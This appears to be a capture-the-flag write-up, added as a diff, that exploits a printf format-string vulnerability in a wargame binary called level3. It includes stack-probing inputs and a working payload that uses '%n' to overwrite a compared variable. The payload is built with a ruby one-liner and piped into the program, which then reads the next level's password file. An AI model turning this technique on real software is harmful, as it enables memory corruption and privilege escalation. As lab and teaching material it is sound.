@@ -1,0 +1,32 @@
+In this program, the function fgets is used. Unlike gets, fgets check the buffer length to avoid overflow.
+We can also see that the function printf is used.
+Printf can be a security issue if it is used without any specifier because the user can then use his own specifiers to access the stack.
+Here, we will be interested in the '%n' specifier that can be used to write values in the memory.
+To be more specific, it will count the number of characters before the '%n' in the string and write it at the given address.
+We can see that there is a comparison right after print with:
+    0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+    0x080484da <+54>:    mov    0x804988c,%eax
+    0x080484df <+59>:    cmp    $0x40,%eax
+
+When using the %x specifier, we can see that a value is changed when we pass a string.
+    ./level3
+    aaaa %x %x %x %x %x %x %x %x
+    aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825
+    
+    ./level3
+    bbbb %x %x %x %x %x %x %x %x
+    bbbb 200 b7fd1ac0 b7ff37d0 62626262 20782520 25207825 78252078 20782520
+
+We can also print the register using its index with %reg_ind$p
+    ./level3
+    bbbbbbbb%4$p %x %x %x %x %x %x %x %x
+    bbbbbbbb0x62626262 200 b7fd1ac0 b7ff37d0 62626262 62626262 70243425 20782520 25207825
+
+We can see that the value storage start at the 4th argument.
+We will use %n to modify the variable as well as the 0x804988c register where our variable is stored.
+We want to display 64 (0x40) bits and then store that value in our register with the %n specifier so that the comparison is successful.
+With '%60x' we will display 60 bytes. To that will be added the 4 bytes of the address.
+
+$ ruby -e 'print "\x8c\x98\x04\x08" + "%60x%4\$n"' > /tmp/buffer_file
+$ cat /tmp/buffer_file - | ./level3
+$ cat /home/user/level4/.pass
